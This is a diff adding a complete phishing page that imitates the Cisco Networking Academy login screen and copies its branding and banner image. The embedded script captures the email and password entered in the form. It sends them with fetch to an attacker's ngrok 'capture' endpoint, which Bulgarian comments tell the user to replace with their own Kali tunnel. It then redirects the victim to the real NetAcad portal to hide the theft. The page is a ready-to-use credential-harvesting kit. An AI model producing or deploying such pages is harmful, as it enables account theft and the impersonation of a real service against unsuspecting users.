@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Login | Networking Academy with Cisco</title>
+    <style>
+        :root {
+            --cui-font-stack: "CiscoSans", "Arial", sans-serif;
+            --cui-color-sky: #00bceb;
+            --cui-color-midnight: #0d274d;
+            --cui-color-gray-900: #212529;
+            --cui-color-gray-200: #f2f2f2;
+            --cui-spacing: 16px;
+            --cui-border-radius: 2px;
+        }
+
+        body {
+            font-family: var(--cui-font-stack);
+            background-color: var(--cui-color-gray-200);
+            margin: 0;
+            display: flex;
+            height: 100vh;
+        }
+
+        .login-banner {
+            flex: 1;
+            background: var(--cui-color-midnight) url('https://auth.netacad.com/auth/resources/0vtvb/login/skillsforall-theme/img/netacad_banner.jpg') no-repeat center center;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 40px;
+            color: white;
+        }
+
+        .login-card-container {
+            flex: 0 0 450px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 350px;
+        }
+
+        h1 { font-size: 28px; font-weight: 400; color: var(--cui-color-gray-900); }
+        
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 700; font-size: 14px; }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: var(--cui-border-radius);
+            box-sizing: border-box;
+        }
+
+        .btn-cisco {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--cui-color-sky);
+            color: white;
+            border: none;
+            border-radius: var(--cui-border-radius);
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .btn-cisco:hover { background-color: #00a3d2; }
+    </style>
+</head>
+<body>
+
+    <div class="login-banner">
+        <h1 style="color: white;">Build Your Skills With Cisco</h1>
+        <p>Pursue real career paths through instructor-led courses.</p>
+    </div>
+
+    <div class="login-card-container">
+        <div class="login-card">
+            <h1>Sign In</h1>
+            <p>Use your Networking Academy credentials.</p>
+            <br>
+            <form id="phish-form">
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="email" required placeholder="Email address">
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" required placeholder="Password">
+                </div>
+                <button type="submit" class="btn-cisco">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phish-form').onsubmit = function(e) {
+            e.preventDefault();
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('password').value;
+
+            // ИЗПРАЩАНЕ КЪМ ТВОЕТО KALI (Ngrok адрес)
+            // ЗАМЕНИ ТОВА С ТВОЯ URL ОТ NGROK
+            const gate = "https://ТВОЯТ-NGROK-ID.ngrok-free.app/capture";
+            
+            fetch(`${gate}?user=${encodeURIComponent(u)}&pass=${encodeURIComponent(p)}`, {
+                mode: 'no-cors'
+            });
+
+            // ПРЕНАСОЧВАНЕ КЪМ ИСТИНСКИЯ САЙТ
+            setTimeout(() => {
+                window.location.href = "https://www.netacad.com/portal/learning";
+            }, 500);
+        };
+    </script>
+</body>
+</html>
